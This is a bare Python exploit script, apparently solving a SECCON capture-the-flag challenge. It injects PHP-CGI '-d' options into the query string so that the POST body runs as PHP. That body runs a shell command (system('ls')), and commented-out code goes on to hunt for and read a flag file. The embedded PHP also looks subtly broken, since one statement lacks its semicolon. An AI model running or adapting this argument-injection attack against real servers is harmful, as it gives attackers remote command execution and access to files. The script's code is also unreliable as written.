import requests

url = "http://automatic_door.pwn.seccon.jp/0b503d0caf712352fc200bc5332c4f95/"
code = "?-d+allow_url_include%3DON+-d+auto_prepend_file%3Dphp://input"
values = """
<?php

    echo "aaa"
    system('ls')
#    $dir = "/" ;
#
#    if( is_dir( $dir ) && $handle = opendir( $dir ) ) {
#        while( ($file = readdir($handle)) !== false ) {
#            if( filetype( $path = $dir . $file ) == "file" ) {
#                if($file == "flag_flag_flag.txt") {
#                    readfile($file);
#                }
#                print "{$file}\n";
#              // $file: ファイル名
#              // $path: ファイルのパス
#            }
#        }
#    }
?>
""".encode('utf-8')
r = requests.post(url+code, data=values)
print(r.text)

